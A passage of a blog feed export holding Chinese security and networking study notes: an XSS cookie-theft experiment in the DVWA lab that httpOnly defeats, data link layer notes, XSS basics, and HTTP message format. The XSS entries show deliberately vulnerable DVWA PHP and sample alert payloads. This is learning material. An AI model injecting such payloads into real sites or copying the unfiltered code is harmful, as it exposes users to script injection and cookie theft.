src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413002445978.png" alt="image-20230413002445978"></p><p>然而，我在url上添加这串payload并回车时，什么事也没有发生……（在dvwa靶场进行测试，已确定安全等级为low，没做过滤）</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413002850368.png" alt="image-20230413002850368"></p><p>在文本框输入这串payload时，确实重定向到我写的php页面了。</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413005102987.png"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003053541.png" alt="image-20230413003053541"></p><p>但是打开cookie.txt只看到这些。。。。</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003200916.png" alt="image-20230413003200916"></p><p>啊？</p><p>我觉得可能是浏览器的问题。打开控制台输入如下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003429193.png" alt="image-20230413003429193"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003513851.png" alt="image-20230413003513851"></p><p>以上使用的是edge浏览器，我又换成了谷歌浏览器，结果还是同样的结果。。。</p><p>查看cookie 确认是有东西的</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003737707.png" alt="image-20230413003737707"></p><p>搞不明白了。。。</p><h2 id="搞明白了"><a href="#搞明白了" class="headerlink" title="搞明白了"></a>搞明白了</h2><p>因为服务器端在setCookie时添加了httpOnly属性（设置为true）</p><blockquote><p>httpOnly： 如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容</p></blockquote><p>因此设置了httpOnly属性后，js脚本是不能读取cookie的。</p><p>问题解决。</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS盗取cookie </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据链路层</title>
      <link href="/2023/04/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2023/04/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="第三章-数据链路层"><a href="#第三章-数据链路层" class="headerlink" title="第三章 数据链路层"></a>第三章 数据链路层</h1><hr><h2 id="本章主要内容"><a href="#本章主要内容" class="headerlink" title="本章主要内容"></a>本章主要内容</h2><ol><li>点对点信道和广播信道的特点，以及对应协议（ppp）（CSMA/CD）的特点</li><li>三个基本问题：封装成帧、透明传输、差错检测</li><li>以太网mac层的硬件地址</li><li>适配器、转发器、集线器、网桥、以太网交换机的作用以及使用场合。</li></ol><h3 id="3-1-数据链路层的几个共同问题"><a href="#3-1-数据链路层的几个共同问题" class="headerlink" title="3.1 数据链路层的几个共同问题"></a>3.1 数据链路层的几个共同问题</h3><p>链路：</p><blockquote><p>从一个节点到相邻结点的一段物理线路，中间无其他交换结点。</p></blockquote><p>数据链路：</p><blockquote><p>物理线路以及实现一些必要的通信协议的硬件和软件</p></blockquote><h4 id="1-封装成帧"><a href="#1-封装成帧" class="headerlink" title="1. 封装成帧"></a>1. 封装成帧</h4><p>给一段数据前后分别加上首部和尾部，便于接收端从比特流中辨认帧的开始和结束位置</p><h4 id="2-透明传输"><a href="#2-透明传输" class="headerlink" title="2. 透明传输"></a>2. 透明传输</h4><p>无论什么样的比特组合的数据，都能按照原样没有差错地通过数据链路层</p><p>也就是说：如果数据中出现了和帧界定符一样的比特组合时，就要采取有效的措施来解决这个问题。</p><h4 id="3-差错检测"><a href="#3-差错检测" class="headerlink" title="3. 差错检测"></a>3. 差错检测</h4><p>传输过程会出现差错（比特差错）难以避免。若判定有差错，那就简单地丢弃这个帧。</p><hr><h3 id="3-2-点对点协议PPP"><a href="#3-2-点对点协议PPP" class="headerlink" title="3.2 点对点协议PPP"></a>3.2 点对点协议PPP</h3><p>点对点协议：</p><blockquote><p>PPP (Point-to-Point Protocol)</p></blockquote><h4 id="ppp协议的特点"><a href="#ppp协议的特点" class="headerlink" title="ppp协议的特点"></a>ppp协议的特点</h4><blockquote><p>互联网用户只有连接某个ISP才能接入互联网。PPP协议就是用户计算机和ISP进行通信时所使用的 <em>数据链路层</em> 协议</p></blockquote><p>PPP协议的组成：</p><ul><li><p>一个将IP数据报封装到串行链路的方法。</p></li><li><p>一个用于建立、配置、测试链路连接的 <strong>链路控制协议</strong> LCP(Link Control Protocol)</p></li><li><p>一套<strong>网络控制协议</strong>，这些协议用于支持不同的网络层协议，如IP</p></li></ul><h5 id="1-各字段的意义"><a href="#1-各字段的意义" class="headerlink" title="1. 各字段的意义"></a>1. 各字段的意义</h5><h5 id="2-字节填充"><a href="#2-字节填充" class="headerlink" title="2. 字节填充"></a>2. 字节填充</h5><h5 id="3-零比特填充"><a href="#3-零比特填充" class="headerlink" title="3. 零比特填充"></a>3. 零比特填充</h5><h4 id="ppp协议的工作状态"><a href="#ppp协议的工作状态" class="headerlink" title="ppp协议的工作状态"></a>ppp协议的工作状态</h4><hr><h3 id="3-3-使用广播信道的数据链路层"><a href="#3-3-使用广播信道的数据链路层" class="headerlink" title="3.3 使用广播信道的数据链路层"></a>3.3 使用广播信道的数据链路层</h3><p>关键词：以太网、局域网</p><p>局域网使用的就是广播信道。</p><h4 id="3-3-1-局域网的数据链路层"><a href="#3-3-1-局域网的数据链路层" class="headerlink" title="3.3.1 局域网的数据链路层"></a>3.3.1 局域网的数据链路层</h4><p>局域网具以下优点：</p><blockquote><ul><li><p>具有广播功能</p></li><li><p>便于系统拓展和逐渐地演变</p></li><li><p>提高了系统的可靠性、可用性、生存性</p></li></ul></blockquote><p>共享信道要解决用户合理共享信道的问题，解决方法如下：</p><blockquote><ul><li><p>静态划分信道</p><p> 频分复用、时分复用、波分复用、码分复用</p></li></ul><ul><li><p>动态媒体接入控制</p><p> 又称为多点接入，信道并非时在用户通信时固定分配给用户</p><ul><li>随机接入：所有用户随机发送信息，可能会产生碰撞。</li><li>受控接入：用户不能随机发送信息，必须服从一定的控制。</li></ul></li></ul></blockquote><h5 id="1-以太网的两个主要标准"><a href="#1-以太网的两个主要标准" class="headerlink" title="1. 以太网的两个主要标准"></a>1. 以太网的两个主要标准</h5><blockquote><ul><li>DIX Ethernet V2</li><li>IEEE 802.3</li></ul></blockquote><p>以上两个标准只有很小的差别</p><p>很多人把采用802.3标准的局域网简称为以太网</p><p>以太网采用<strong>无连接</strong>的工作方式，不必先建立连接就可以直接发送数据。</p><p>以太网提供的服务是 尽最大努力的交付  即不可靠的交付</p><h5 id="2-适配器的作用"><a href="#2-适配器的作用" class="headerlink" title="2. 适配器的作用"></a>2. 适配器的作用</h5><blockquote><p>计算机与外部局域网的连接需要通过适配器</p></blockquote><p>适配器本是主机箱内插入的一块网络接口板，这种接口板又称为网络接口卡，简称网卡。</p><p>现在计算机上已经嵌入了这种适配器，不再使用单独的网卡了</p><h4 id="3-3-2-CSMA-CD协议"><a href="#3-3-2-CSMA-CD协议" class="headerlink" title="3.3.2 CSMA/CD协议"></a>3.3.2 CSMA/CD协议</h4><blockquote><p>CSMA/CD: 载波监听多点接入/碰撞检测(Carrier Sense Multiple Access with Collision Detection)</p></blockquote><h5 id="几个概念："><a href="#几个概念：" class="headerlink" title="几个概念："></a>几个概念：</h5><p>载波监听</p><blockquote><p>边发送边监听。 不管在数据发送前还是数据发送中，每个站都必须不停地检测信道。保证不在其他站发送数据时发送数据，产生干扰。</p></blockquote><p>多点接入</p><blockquote><p>说明是总线型网路，许多计算机以多点接入的方式连接在一根总线上。</p></blockquote><p>碰撞检测</p><blockquote><p>适配器边发送数据，边检测信道上的信号电压的变化情况。当两个或者几个站同时发送数据时，总线上的电压会增大（互相叠加），表明发生了碰撞。一旦发现总线出现了碰撞，适配器就要立即停止发送数据。</p></blockquote><p>尽管有以上技术作为保证，数据在总线上仍然会出现碰撞。（数据在总线上传输是有延时的，上一秒还没监听到信号，下一秒可能信号就传到了，但己方已经把数据发出去了）</p><p>因为同一时间只能有一个站在发送信息，因此只能进行半双工通信，不能进行全双工通信。</p><p>争用期</p><blockquote><p>以太网端到端往返时间 2τ 数据发送后，经过这段时间还没有检测到碰撞，才能肯定这次发送一定不会产生碰撞。</p></blockquote><p>基本退避时间为争用期2τ 具体的争用期时间是51.2微秒</p><p>当数据发送不成功时就要重传，从0—2*k-1  这些整数中随机选出一个数，这个数乘以2τ 就是推迟重传时间（不一定要推迟，可以立即发送）</p><p>当重传16次仍然不成功，那么就丢弃该帧，并向高层报告。（这种情况表明同一时间想发送数据的站太多）</p><p>最短帧</p><p>如果发送的帧很短，那么可能会出现以下情况</p><blockquote><p>发送方发完了这个很短的帧，没有检测到碰撞，但是实际上在发送后这个帧与其他站发送的数据产生了碰撞。</p></blockquote><p>这种情况会导致发送方不知道发送失败了，因此不会重传（数据永久丢失了）</p><p>为了避免这种情况，以太网规定帧长最短不能小于64字节</p><p>最短帧是64字节</p><p>凡是小于64字节的帧都是无效帧，都应该被丢弃</p><p>帧间最小间隔</p><blockquote><p>9.6微秒 </p></blockquote><p>作用是防止接收方来不及反应，留出时间处理上一个帧的缓存</p><p>强化碰撞：</p><p>当发送数据的站检测到碰撞以后，除了立即停止发送数据以外，还需要发送人为的干扰信号，方便让所有站都知道已经发生了碰撞</p><h4 id="3-3-3-使用集线器的星型拓扑"><a href="#3-3-3-使用集线器的星型拓扑" class="headerlink" title="3.3.3 使用集线器的星型拓扑"></a>3.3.3 使用集线器的星型拓扑</h4><h5 id="几个概念"><a href="#几个概念" class="headerlink" title="几个概念"></a>几个概念</h5><p>10BASE-T标准</p><blockquote><p>10代表10Mbit/s的数据率   base代表信号是基带信号   T代表双绞线</p></blockquote><p>10BASS-F </p><blockquote><p>与10BASE-T类似，F代表光纤</p></blockquote><p>集线器</p><blockquote><p>位于星型拓扑以太网的中心，取代了单一的总线</p></blockquote><p>集线器工作在物理层，只进行转发，不负责碰撞检测。</p><h4 id="3-3-4-以太网的信道利用率"><a href="#3-3-4-以太网的信道利用率" class="headerlink" title="3.3.4 以太网的信道利用率"></a>3.3.4 以太网的信道利用率</h4><p>成功发送一个帧所经历的时间是 T0+τ</p><p>T0: 完整发送一个帧的时间</p><p>τ：从信道起点到终点传输过程中经历的时间</p><blockquote><p>a: 单程端到端时延 τ 与帧的发送时间 T0 之比</p></blockquote><p>a = τ/T0</p><p>a越小，信道利用率越高。 因为a趋近于0时，表示一旦发生碰撞，就能马上检测出来，并立即停止发送。因而信道资源被浪费的时间很少。</p><h4 id="3-3-5-以太网的mac层"><a href="#3-3-5-以太网的mac层" class="headerlink" title="3.3.5 以太网的mac层"></a>3.3.5 以太网的mac层</h4><p>MAC地址：单独表示每个适配器，每个MAC地址全球唯一</p><p>MAC帧的格式：</p><blockquote><p>后面补充</p></blockquote><p>适配器的过滤功能：</p><blockquote><p>适配器每从网络上收到一个mac帧，先用硬件检查帧中的目的地址。如果是发往本站的就收下，如果不是，那就丢弃。</p></blockquote><h3 id="3-4-拓展的以太网"><a href="#3-4-拓展的以太网" class="headerlink" title="3.4 拓展的以太网"></a>3.4 拓展的以太网</h3><h4 id="3-4-1-在物理层拓展以太网"><a href="#3-4-1-在物理层拓展以太网" class="headerlink" title="3.4.1 在物理层拓展以太网"></a>3.4.1 在物理层拓展以太网</h4><p>涉及到的设备：</p><ul><li>光纤和调制解调器：拓展主机和集线器之间的距离</li><li>集线器：代替总线</li></ul><p>涉及的概念：</p><blockquote><p>碰撞域： 又称为冲突域。在这个域内，同一时间只能有一个设备在发数据，否则就会冲突。</p></blockquote><blockquote><p>碰撞域的最大吞吐量： 假设三个系通过集线器连接起来，其中每个系的最大吞吐量都是10Mbit/s 那这个连接起来的碰撞域的最大吞吐量就是30Mbit/s</p></blockquote><p>注意： 如果不同的系使用不同的以太网技术（如：数据率不同），就不能用集线器将他们互联起来。</p><p>如果一个系使用10Mbit/s的适配器，另外的系使用10/100Mbit/s的适配器，连起来后，就只能支持10Mbit/s的工作速率。因为集线器只能转发，不能缓存。</p><h4 id="3-4-2-在数据链路层拓展以太网"><a href="#3-4-2-在数据链路层拓展以太网" class="headerlink" title="3.4.2 在数据链路层拓展以太网"></a>3.4.2 在数据链路层拓展以太网</h4><p>涉及到的设备：</p><ul><li>网桥：根据收到的帧根据其MAC帧目的地址进行转发和过滤。</li><li>交换机：工作在数据链路层，实质上是一个多端口的网桥，每个端口都与一台单独的主机或另一台交换机相连，工作在全双工模式。</li></ul><p>涉及到的概念：</p><blockquote><p>交换机的自学习： 当交换机收到一个帧时，先检测交换表里有没有这个帧目的地址设备的记录，如果有就可以确定需要转发的端口；如果没有，则先在交换表记录下发送这个帧的设备的MAC地址和帧的来源端口，再对除来源端口外的其他端口进行广播。这个过程一直循环，最后交换表里就会存储有连接这台交换机所有站的MAC地址和对应连接端口。</p><p>交换表： 交换机是一种即插即用的设备，其内部有张交换表（地址表），通过自学习，交换表里会存储连接这台交换机的所有站的MAC地址和连接的端口，以便在收到新的帧时，只需要检测帧的目的地址就能直接确定调用哪个端口</p><p>”兜圈子“问题：当网络中存在冗余链路（如：两台交换机存在一个环形回路）时，可能会导致以太网帧再某个环路中无线兜圈子，白白消耗了网络资源。</p><p>解决兜圈子问题的方案：在逻辑上切断环路。IEEE的802.1D标准制定的生成树协议STP</p></blockquote><h4 id="3-4-2-虚拟局域网"><a href="#3-4-2-虚拟局域网" class="headerlink" title="3.4.2 虚拟局域网"></a>3.4.2 虚拟局域网</h4><p>虚拟局域网的作用：</p><blockquote><p>缩小广播域，把一个大的以太网，在逻辑上分割成几个小的以太网，每个小的以太网各自成为新的广播域</p></blockquote><h3 id="3-5-高速以太网"><a href="#3-5-高速以太网" class="headerlink" title="3.5 高速以太网"></a>3.5 高速以太网</h3><p>100BASE-T 以太网</p><blockquote><p>Fast Ethernet快速以太网   在双绞线上传输 100Mbit/s基带信号的星型拓扑以太网，仍使用IEEE802.3的 CSMA/CD 协议。</p></blockquote><p>吉比特以太网</p><blockquote><p>使用802.3z标准，具有以下特点：</p><ul><li>允许在1Gbit/s下以全双工和半双工两种方式工作。</li><li>使用IEEE802.3协议规定的帧格式</li><li>半双工下使用CSMA/CD协议，全双工下不使用</li><li>与10BASE-T和100BASE-T技术向后兼容</li></ul></blockquote><p>10吉比特以太网</p><blockquote><p>帧的格式没有变化。</p><p>只工作在全双工模式。因此不存在争用问题，不适用CSMA/CD协议。</p></blockquote><h3 id="3-6-使用以太网进行宽带接入"><a href="#3-6-使用以太网进行宽带接入" class="headerlink" title="3.6 使用以太网进行宽带接入"></a>3.6 使用以太网进行宽带接入</h3><p>把ppp协议中的ppp帧封装到以太网中来传输————PPPoE（PPP over Ethernet）</p><p>例： 使用光纤到大楼方案（FTTB），用光纤连接每栋大楼，在每栋大楼的楼梯口安装一个光网络单元ONU ，根据用户所申请的带宽，使用5类线接到用户家中。用户只需要用5类线把自己的个人电脑连接到墙上的RJ-45接口上，然后在PPPoE的弹出窗口输入自己在运营商处购买的用户名和密码，就可以进行宽带上网了。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 数据链路层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞基础</title>
      <link href="/2023/04/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/04/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS漏洞基础"><a href="#XSS漏洞基础" class="headerlink" title="XSS漏洞基础"></a>XSS漏洞基础</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote><p>xss 跨站脚本攻击(Cross Site Scripting)</p><p>其实应该简称为css，但是这与层叠样式表的缩写重合了，因此改名xss。</p><p>攻击者会在web页面中的input表单、url、留言板等位置插入js代码，导致用户访问时触发，达到攻击目的。</p></blockquote><hr><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>服务器对用户提交的数据没做过滤，或者过滤不严，导致浏览器把用户的输入当成了js代码并直接返回给客户端执行。</p><hr><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li>反射型（非持久）</li><li>存储型（持久）</li><li>DOM型（非持久）</li></ul><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><h5 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h5><h6 id="攻击者：发现存在反射型xss的url-gt-构造xss代码-gt-进行编码、缩短（增加迷惑性）-gt-发送给受害者"><a href="#攻击者：发现存在反射型xss的url-gt-构造xss代码-gt-进行编码、缩短（增加迷惑性）-gt-发送给受害者" class="headerlink" title="攻击者：发现存在反射型xss的url  -&gt;  构造xss代码   -&gt;   进行编码、缩短（增加迷惑性）  -&gt;  发送给受害者"></a>攻击者：发现存在反射型xss的url  -&gt;  构造xss代码   -&gt;   进行编码、缩短（增加迷惑性）  -&gt;  发送给受害者</h6><h6 id="受害者：收到链接并点开-gt-xss代码执行"><a href="#受害者：收到链接并点开-gt-xss代码执行" class="headerlink" title="受害者：收到链接并点开  -&gt;  xss代码执行"></a>受害者：收到链接并点开  -&gt;  xss代码执行</h6><blockquote><p>攻击对受害者而言是一次性的。</p></blockquote><p>例：</p><p>php源代码： 发现未做过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试:  在输入框输入xss探针、payload进行测试 发现构造的脚本被执行了</p><p>URL:   观察URL结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=</span><br></pre></td></tr></table></figure><p>构造：  插入脚本语句 <script>alert("xss");</script></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E</span><br></pre></td></tr></table></figure><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>应用程序通过web请求获取数据，在未检验是否存在xss代码的情况下就存入数据库。用户下一次请求从数据库中获取该数据的时候，该程序也没进行过滤，最终用户浏览器界面执行xss代码。</p><p>这种xss漏洞的影响是持久性的。由于xss代码被储存在了数据库中，因此每当用户获取这些数据时都会获取到xss代码。只要xss代码仍在数据库中存在，这个过程就还会重现。</p><p>这种类型的xss常见于网站的评论区。用户提交了包含xss代码的留言到数据库，当目标用户查询留言时，留言中的xss代码就会加载出来并被当成脚本执行。</p><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>攻击者： 发现存在存储型xss  -&gt;  构造xss代码并提交至网站数据库中</p><p>受害者： 点开目标网站，网站服务端将恶意代码从数据库中取出，拼接在html发送给受害者的浏览器  -&gt; 受害者浏览器收到响应后解析执行，同时恶意代码也被执行</p><p>例：</p><p>php源代码：发现未做过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在评论区发送xss恶意代码，使其被存入网站数据库</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p>等受害者浏览网页，查看评论区并加载该评论时，浏览器解析到xss代码并执行脚本</p><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>通过javascript操作document，实现dom树的重构。</p><p>主要存在于用户能修改页面的dom，造成客户端payload在浏览器中执行</p><p>这个暂时理解不到位，正在深入学…</p><hr><h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><h4 id="对输入的数据和URL参数进行过滤"><a href="#对输入的数据和URL参数进行过滤" class="headerlink" title="对输入的数据和URL参数进行过滤"></a>对输入的数据和URL参数进行过滤</h4><p>检查是否含有特殊字符 如</p><blockquote><p>&lt;   &gt;    ‘    “</p></blockquote><p>将以上字符过滤，或者编码</p><h4 id="对输出内容进行编码"><a href="#对输出内容进行编码" class="headerlink" title="对输出内容进行编码"></a>对输出内容进行编码</h4><p>变量的内容输出到HTML页面时，用编码或者转义的方式来防御攻击。</p><h4 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h4><p>将字符串js编码转换成实体html编码</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS漏洞基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http请求报文</title>
      <link href="/2023/04/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87/"/>
      <url>/2023/04/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h3 id="http请求报文"><a href="#http请求报文" class="headerlink" title="http请求报文"></a>http请求报文</h3><h4 id="HTTP请求由四个部分组成"><a href="#HTTP请求由四个部分组成" class="headerlink" title="HTTP请求由四个部分组成"></a>HTTP请求由四个部分组成</h4><ul><li>请求行</li><li>消息报头</li><li>空行</li><li>请求正文</li></ul><p>请求行：Method request-URI HTTP-Version CRLF</p><blockquote><p>method：表示请求方法</p><p>Request-URI：统一的资源标识符</p><p>HTTP-Version：表示请求的HTTP协议版本</p><p>CRLF：表示回车和换行</p></blockquote><p>请求头部： 允许客户端传递关于自身的信息和希望的响应形式 </p><p>空行：表示请求头结束，请求正文开始</p><p>请求正文（只有post请求时才会由请求正文）</p><blockquote><p>get方法：提交数据时，参数会作为url的一部分发送给服务器</p><p>post方法：发送的数据在请求体中</p></blockquote><h3 id="http响应报文"><a href="#http响应报文" class="headerlink" title="http响应报文"></a>http响应报文</h3><h4 id="HTTP响应由四个部分组成"><a href="#HTTP响应由四个部分组成" class="headerlink" title="HTTP响应由四个部分组成"></a>HTTP响应由四个部分组成</h4><ul><li>状态行</li><li>消息报头</li><li>空行</li><li>响应正文</li></ul><p>状态行：</p><p>[HTTP-Version]  [Status-Code(状态码)] [Reason-Phrase(原因)] [CRLF]</p><p>其中：</p><blockquote><p>状态响应代码由3个数字组成。第一个数字定义了响应的类别：</p></blockquote><p>如：</p><blockquote><p>1xx：指示信息  表示请求已经接收，继续处理</p><p>2xx：成功  表示请求已经被成功接收</p><p>3xx：重定向 要完成请求必须进一步操作</p><p>4xx：客户端错误  有错误语法，或者请求无法实现</p><p>5xx：服务器端错误  